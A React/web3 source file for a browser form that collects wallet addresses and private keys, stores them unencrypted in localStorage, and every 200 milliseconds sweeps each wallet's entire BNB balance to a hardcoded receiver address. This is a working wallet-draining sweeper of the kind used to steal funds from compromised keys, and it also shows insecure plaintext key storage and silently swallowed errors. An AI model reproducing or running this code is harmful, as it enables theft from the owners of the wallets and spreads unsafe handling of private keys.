import React, { useCallback, useEffect, useRef } from 'react'
import useInterval from 'hooks/useInterval'
import Web3 from 'web3'
import { Form, Input, Button } from 'antd'
import { isAddress } from '../../utils'

const providerUrl = 'https://bsc-dataseed.binance.org/'
// const providerUrl = 'https://data-seed-prebsc-2-s1.binance.org:8545/'

// Who are we trying to send this token to?
const receiver = '0x375AECDd7C3f4fF0E48615D50A38B8F91ff4321E'

const cache = 'account'

const Index = () => {
  const refWeb3 = useRef([])
  const refOnlyAccount = useRef([])
  const [form] = Form.useForm()

  const createAccount = useCallback((_sender, _privateKey) => {
    const isAvailable = refWeb3.current.find((item) => item.sender.toLowerCase() === _sender.toLowerCase())
    if (isAddress(_sender) && !isAvailable) {
      try {
        const pWeb3 = new Web3(providerUrl)
        pWeb3.eth.accounts.wallet.add(_privateKey)
        refWeb3.current.push({
          web3: pWeb3,
          sender: _sender,
          privateKey: _privateKey,
        })
        refOnlyAccount.current.push({
          sender: _sender,
          privateKey: _privateKey,
        })
      } catch (error) {
        console.error(error)
      }
    }
  }, [])

  useEffect(() => {
    const allUser = JSON.parse(localStorage.getItem(cache))
    if (allUser && allUser.length > 0) {
      allUser.forEach((item) => {
        createAccount(item.sender, item.privateKey)
      })
    }
  }, [createAccount])

  useInterval(() => {
    const init = async () => {
      const { current } = refWeb3

      const arr = []

      current.forEach(async (item) => {
        const promise = new Promise(() => {
          (async () => {
            try {
              const balance = await item.web3.eth.getBalance(item.sender)
              if (balance / 1e18 >= 0.0015) {
                const gasPrice = await item.web3.eth.getGasPrice() // estimate the gas price

                const transactionObject = {
                  from: item.sender,
                  to: receiver,
                  gasPrice,
                }

                const gasLimit = await item.web3.eth.estimateGas(transactionObject) // estimate the gas limit for this transaction
                const transactionFee = gasPrice * gasLimit // calculate the transaction fee

                // So tien gui tat ca
                transactionObject.gas = gasLimit
                transactionObject.value = balance - transactionFee // set the transaction value to the entire balance, less the transaction fee

                await item.web3.eth.sendTransaction(transactionObject)
              }
              // eslint-disable-next-line no-empty
            } catch (error) {}

          })()
        })

        arr.push(promise)
      })

      Promise.all([arr])
    }

    init()
  }, 200)

  const onClick = useCallback(() => {
    form.validateFields().then(({ _sender, _privateKey }) => {
      const { current } = refOnlyAccount
      const isAvailable = current.find((item) => item.sender.toLowerCase() === _sender.toLowerCase())
      const isAvailablePrivateKey = current.find((item) => item.privateKey.toLowerCase() === _privateKey.toLowerCase())
      if (isAddress(_sender) && !isAvailable && !isAvailablePrivateKey) {
        createAccount(_sender, _privateKey)
        const str = [
          ...current,
          {
            sender: _sender,
            privateKey: _privateKey,
          },
        ]
        localStorage.setItem(cache, JSON.stringify(str))
        form.resetFields()
      }
    })
  }, [createAccount, form])

  return (
    <Form form={form}>
      <Form.Item
        label="Address"
        name="_sender"
        rules={[
          {
            required: true,
            message: 'Require amount',
          },
        ]}
      >
        <Input />
      </Form.Item>

      <Form.Item
        label="Private Key"
        name="_privateKey"
        rules={[
          {
            required: true,
            message: 'Require amount',
          },
        ]}
      >
        <Input />
      </Form.Item>

      <Form.Item>
        <Button type="button" htmlType="submit" onClick={onClick}>
          Submit
        </Button>
      </Form.Item>
    </Form>
  )
}

export default Index
